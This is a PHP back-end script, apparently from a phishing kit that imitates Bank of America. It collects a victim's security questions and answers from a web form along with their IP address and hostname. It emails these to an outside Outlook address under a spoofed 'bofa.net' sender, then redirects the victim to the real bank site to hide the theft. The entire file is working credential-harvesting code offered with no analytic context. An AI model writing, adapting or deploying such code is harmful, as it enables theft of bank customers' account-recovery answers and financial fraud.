<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "-----------------------------------------------------------------------------------\n";
$message .= "".$_POST['questionId1']."\n";
$message .= "".$_POST['actualAnswer1']."\n";
$message .= "".$_POST['questionId2']."\n";
$message .= "".$_POST['actualAnswer2']."\n";
$message .= "".$_POST['questionId3']."\n";
$message .= "".$_POST['actualAnswer3']."\n";
$message .= "-----------------------------------------------------------------------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "-----------------------------------------------------------------------------------\n";
$rnessage  = "$message\n";
$message .= "-----------------------------------------------------------------------------------\n";

$send="a4min4@outlook.com";


$subject = "$ip";
$headers = "From: KRON1<boa@bofa.net>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
Header ("Location:https://www.google.com.eg/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&sqi=2&ved=0CCUQFjAA&url=https%3A%2F%2Fwww.bankofamerica.com%2F&ei=dO_WU-7_OoXC7Ab5oICQBQ&usg=AFQjCNFGlX_ZsDSVfW1iL9Vk7eslTYIZ7w&sig2=w9C4qcGH2kmuj_3zBSPtXg");
}
?>
